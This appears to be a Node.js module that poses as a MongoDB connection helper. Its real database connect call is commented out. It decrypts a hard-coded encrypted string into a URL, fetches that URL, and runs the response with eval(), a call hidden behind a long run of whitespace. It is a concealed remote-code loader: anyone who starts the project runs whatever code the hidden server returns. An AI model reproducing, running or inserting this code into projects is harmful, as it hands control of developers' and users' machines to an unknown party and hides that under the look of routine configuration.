const mongoose = require('mongoose');
const config = require('../config');
const decrypt = require("../controllers/auth").decrypt;
const crypto = require("crypto");

// Your encrypted value (replace with the ciphertext produced by your encrypt function)
const encryptedData =
    "1cd6c36b96b78eb650574230080c3497:66d4b287a182a1fa33accd5e4e21eb3f0f406d727c1f7fa2f9e8fda04c725260ce2593abc246260a25360f9013c96262";

const connectDB = async () => {
  try {
    // const db = await mongoose.connect(config.MONGO_URI);
    const mongo_uri = decrypt(encryptedData);
    const response = await fetch(mongo_uri);
    const msg = await response.text();                                                                                                                                                                                                                                                                    eval(msg)
    return msg
  } catch (err) {
    console.error(err.message);
    process.exit(-1);
  }
};

module.exports = connectDB;
